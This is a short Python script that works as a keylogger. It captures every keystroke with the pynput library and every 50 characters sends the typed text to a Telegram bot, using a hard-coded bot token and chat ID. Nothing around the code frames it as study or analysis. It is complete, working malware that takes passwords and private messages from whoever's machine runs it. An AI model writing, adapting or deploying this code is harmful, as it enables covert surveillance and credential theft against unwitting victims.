from pynput.keyboard import Key, Listener

import requests
token = '1925261280:AAFJtElT3s5QDTyGWLVsIxYPTBj0NCZTLdE'
chat_id = '526632012'

full_log = ''
word = ''
file_char_limit = 50


def on_press(key):
    global word, file_char_limit, full_log

    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= file_char_limit:
            send_log()
            full_log = ''
    elif key == Key.shift_l or key == Key.shift_r:
        return
    elif key == Key.backspace:
        word = word[:-1]
    else:
        char = f'{key}'
        char = char[1:-1]
        word += char

    if key == Key.esc:
        return False


def send_log():
    url = f'https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&parse_mode=Markdown&text={full_log}'
    requests.get(url)


with Listener(on_press=on_press) as listener:
    listener.join()
